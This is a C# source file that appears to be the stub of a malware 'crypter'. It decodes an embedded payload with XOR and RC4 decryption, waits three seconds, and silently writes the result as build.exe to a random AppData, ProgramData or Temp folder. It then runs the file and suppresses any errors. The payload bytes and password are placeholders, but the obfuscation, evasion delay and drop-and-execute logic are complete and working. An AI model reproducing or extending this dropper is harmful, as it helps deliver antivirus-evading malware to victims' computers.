﻿using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace BasicCryptorFromDebil
{
    class Program
    {
        static void Main(string[] args)
        {
            Thread.Sleep(3000);
            byte[] EnencryptedBytes = StringToByteArray(XOR("[BYTES]"));
            byte[] passBytes = Encoding.Default.GetBytes("[PASSWORD]");
            byte[] decryptedBytes = RC4(passBytes, EnencryptedBytes);
            bigAss(decryptedBytes, "build.exe");
        }
        static void bigAss(byte[] bytes, string fileName)
        {
            string[] dirs = new string[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                Path.GetTempPath()

            };

            Random random = new Random();
            int pathIndex = random.Next(0, dirs.Length);

            string filePath = dirs[pathIndex] + "\\" + fileName;

            try
            {
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
                File.WriteAllBytes(filePath, bytes);
                Process.Start(filePath);
            }
            catch { }
        }
        static byte[] RC4(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }
        static byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }
        static string XOR(string target)
        {
            string result = "";

            for (int i = 0; i < target.Length; i++)
            {
                char ch = (char)(target[i] ^ 123);
                result += ch;
            }

            //Console.WriteLine("XOR Encoded string: " + result);
            return result;
        }
    }
}
